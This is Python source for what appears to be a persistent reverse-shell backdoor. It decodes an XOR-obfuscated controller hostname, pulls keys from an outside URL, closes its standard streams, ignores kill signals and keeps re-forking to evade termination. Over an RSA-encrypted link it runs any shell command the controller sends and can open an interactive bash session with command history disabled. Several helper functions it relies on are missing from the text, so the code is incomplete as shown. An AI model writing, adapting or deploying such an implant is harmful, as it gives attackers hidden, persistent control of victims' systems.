import os, sys, socket, time, signal, subprocess, selectors, pty, requests

server_modulus = 566985700738319622174686131400034453643720466970978517574628629274979976524124940713860540038882426013024114564601644133774454954579859603022526047211561634473245368041734849645333850659593387029777461624139999293346678168096585398894872902836488432305321788895930893995350254306011511954048973993218576068120842406854381660868440914954041085267631248545101914138883676131275460708745009456577214046268195248043933401098454229528930264593554947172986600022924103676180205323189749504546460222696144254434950563003806500524021358243739253925888283568187475109036444929999292467231057057868003949542201486910774286204467263359268168124928585201908563486221036238676222817747434022603388355897696091620276281574099795985472307965135468502881374317279001616973398539298555877212283138431306761372378738101671232030286096798836533645647014376468992868000495595560982785914820504104078715279785802300066599327401921364225207587243296778060887445799525002269634182195900334989318967452442166075135355126785800284396564017524632233821326493688824504309419677467169118434525079593731269479730143537689127087750148171355493757239210404790175123435648784211703985569364347710928586741341454862278795609365544396160373248258804813219121521794117
hostkeys_url = "https://war.cflems.net/hosts.json"
hdb = {}

args_used = 0
def get_param(env_name, prompt, default):
    global args_used

    if env_name in os.environ and len(os.environ[env_name]) > 0:
        return os.environ[env_name]
    elif len(sys.argv) > args_used+1 and len(sys.argv[args_used+1]) > 0:
        args_used += 1
        return sys.argv[args_used]
    else:
        try:
            inp = input(prompt).strip()
            if len(inp) < 1:
                return default
            return inp
        except:
            return default

def chm (eky):
    return ''.join([chr(ord(qjv)^0x4c) for qjv in eky])

def main():
    port, bits = 2236, 4096
    ha = get_param('HOST', 'host=', chm('?)\'b/* )!?b")8'))
    tts = int(get_param('TTS', 'tts=', 60*30))
    bits = int(get_param('BITS', 'bits=', 4096))

    if ':' in ha:
        ha, port = ha.split(':')
        port = int(port)

    print('working')
    p,q,n,e,d = keygen(bits=bits)
    privkey = { 'n': n, 'd': d }
#    privkey = {
#        'n': 674649662747625158965580115649178823272937828671923055234230118266931114418063863425902553767263142112542805798629142731671175353897804485874369880648083704894282886619537285020154984320953903442140692688705887858628043554629805552160716928322839690265157756094009091892991782686467078804688183898466651445834021412680038767167042108036687656414710122361011361917032792883563683007035058615411826538055235483613942740927955921096798359185412920854812805376322359915714231871871568424355947626388369950685381160530003214146725114192144988981658555628868369558202192054627854973191485227523237030576707646163814866120912990720235595971139226256104235293622034976084428012861996082688820722776078055805226922381766417607129202444978552096123079779915276070260212133669863304488559497181245115636814644889044344999249791772743710292169123830534114304441561708365458460310379661336014020642436193548760392290734206895092462336538024371456173590044273138897608100072601300892612489480942246533172892447101244128180845969174975384201677662487434267991209429226437671546280301876296929776386242804688267157569604022638425121011606496845224340844040952164598264796845276039678476313199137656762940091358393013259651079302939058075325266358059,
#        'd': 123190449884810569256162125882687992708046553789720359521919401640300359281641977106333458366004516863158212261656696996656986976213360792872096439594665878762681894260890835556040018575291138784077661006847175793890501506298043594346816294325944467604607212218700990321244986243022285610505569322870293389265540599135481085900910827576407848761994537960148053283811151447847881266234166142036305112850862917625281181327873544833687626293114369346621676944908214918463649736952974035037728691349766135158032200864588682174860909738581245451325326688903486252086693506229023917240375722382327197535918037164386110180025692542030519669869798513292176347067812774772055482976141030322108067300132951879539462308628409435585075827153210214489887848992420042946201502647706258955963330527121007200645631026325263435508851811642610336364629931427516575798083669051902023046582421072617988530143157607306849734347534916236748625014691873176302502503418187291487697071628848229831657193179685201638365913357263238485692002634666040940151268246333847325390266342288529675646062045549681463229686224509227099656446292062053127918284303699573724644298937367416786776616819815876327182145017335648056648340177994549748253054143476876114005129129,
#    }
    refresh_hdb()
    print('done')
    shield()
    polymorph()

    while True:
        if not work(ha, port, privkey, bits=bits):
            return
        polymorph()
        time.sleep(tts)

def shield():
    for sig in [signal.SIGHUP, signal.SIGINT, signal.SIGABRT, signal.SIGQUIT, signal.SIGTERM]:
        signal.signal(sig, sh)
    for fd in [sys.stdin, sys.stdout, sys.stderr]:
        os.close(fd.fileno())

def sh(a, b):
    polymorph()

def polymorph():
    if os.fork() != 0:
        sys.exit(0)

def handshake(sock, privkey, rpubkey, bits):
    nbytes, headsz = bits//8, 2
    sock.sendall(nbytes.to_bytes(headsz, 'big'))
    rnbytes = int.from_bytes(sock.recv(headsz), 'big')
    if rnbytes != nbytes:
        return False

    send_encrypted(sock, privkey['n'].to_bytes(nbytes, 'big'), rpubkey['e'], rpubkey['n'], bits=bits)
    return True

def refresh_hdb():
    global hostkeys_url, hdb
    try:
        resp = requests.get(hostkeys_url)
        resp.close()
        if resp.status_code != 200:
            return False
        hdb = resp.json()
        return True
    except:
        return False

def get_hostkey(host):
    global hdb, exp
    if 'keys' not in hdb:
        return False
    hkdb = hdb['keys']
    if host not in hkdb:
        return False
    hostent = hkdb[host]
    if 'n' not in hostent:
        del hkdb[host]
        return False
    try:
        return {'n': int(hostent['n']),
                'e': int(hostent['e']) if 'e' in hostent else exp}
    except:
        del hkdb[host]
        return False

def run_pty(sock, screen_is, screen_os):
    term = screen_is.recv()
    sel = selectors.DefaultSelector()
    pid, shfd = pty.fork()
    if pid == 0:
        os.environ['HISTFILE'] = ''
        if type(term) == bytes:
            term = str(term, 'utf-8')
        os.environ['TERM'] = term
        os.execle('/bin/bash', '/bin/bash', os.environ)

    try:
        sel.register(shfd, selectors.EVENT_READ, 0)
        sel.register(sock, selectors.EVENT_READ, 1)
        while True:
            events = sel.select()
            for event, mask in events:
                if event.data == 0:
                    try:
                        data = os.read(shfd, 1024)
                    except:
                        data = False
                    if not data:
                        return True
                    screen_os.send(data)
                else:
                    try:
                        data = screen_is.recv()
                    except:
                        data = False
                    if not data:
                        return False
                    elif data == b'\xc0\xdenpty':
                        return True
                    os.write(shfd, data)
    except:
        return
    finally:
        sel.close()
        try:
            os.close(shfd)
        except:
            pass

def work(h_addr, port, privkey, bits):
    global server_modulus, exp
    try:
        host = socket.gethostbyname(h_addr)
    except:
        host = h_addr
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((host, port))
        hostkey = get_hostkey(host)
        if hostkey:
            rpubkey = hostkey
        else:
            rpubkey = {'n': server_modulus, 'e': exp}
        if not handshake(sock, privkey, rpubkey, bits=bits):
            return True

        if 'PS1' not in os.environ:
            os.environ['PS1'] = '$ '
        send_encrypted(sock, os.environ['PS1'], rpubkey['e'], rpubkey['n'], bits=bits)
        while True:
            # TODO: this hangs or errors after a pty
            cmd = recv_encrypted(sock, privkey['d'], privkey['n'], bits=bits)
            if cmd == b'tunnel':
                send_encrypted(sock, b'\xde\xad', rpubkey['e'], rpubkey['n'], bits=bits)
                return True
            elif cmd == b'die':
                send_encrypted(sock, b'\xde\xad', rpubkey['e'], rpubkey['n'], bits=bits)
                return False
            elif cmd == b'refresh-hdb':
                if refresh_hdb():
                    response = '[pk] Host database refreshed.\n'
                else:
                    response = '[pk] Error: could not refresh host database.\n'
            elif cmd == b'pty':
                send_encrypted(sock, b'\xc0\xdeflush', rpubkey['e'], rpubkey['n'], bits=bits)
                screen_is = InStreamCipher(sock, privkey, bits=bits)
                screen_os = OutStreamCipher(sock, rpubkey, bits=bits)
                if not run_pty(sock, screen_is, screen_os):
                    return True
                screen_os.send(b'\xc0\xdenpty')
                assert(screen_is.recv() == b'\xc0\xdeflush')
                # TODO: this comes on time but the process zombifies after for some reason
                continue
            else:
                try:
                    proc = subprocess.Popen(['sh', '-c', cmd], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = proc.communicate()
                    response = stdout+stderr
                    if type(response) == bytes:
                        response = str(response, 'utf-8')
                except Exception as e:
                    response = '%s\n' % str(e)
            send_encrypted(sock, '%s%s' % (response, os.environ['PS1']), rpubkey['e'], rpubkey['n'], bits=bits)
    except:
        return True
    finally:
        sock.close()

if __name__ == '__main__':
    main()
